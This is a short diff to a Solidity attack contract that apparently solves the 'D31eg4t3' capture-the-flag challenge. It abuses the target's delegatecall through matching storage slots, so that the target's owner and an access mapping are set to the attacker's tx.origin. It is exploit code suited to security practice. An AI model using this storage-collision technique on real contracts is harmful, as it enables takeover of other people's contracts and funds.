@@ -36,12 +36,14 @@ contract D31eg4t3Hack {
     uint32 private placeholder4;
     string private placeholder5;
     address public owner;
+    mapping(address => bool) public canYouHackMe;
 
     function hackd31eg4t3(D31eg4t3 delegate) external {
-        delegate.hackMe(abi.encodeWithSignature("changeOwner()"));
+        delegate.hackMe(abi.encodeWithSignature("changeOwnerAndMapping()"));
     }
 
-    function changeOwner() external {
+    function changeOwnerAndMapping() external {
         owner = tx.origin;
+        canYouHackMe[tx.origin] = true;
     }
 }
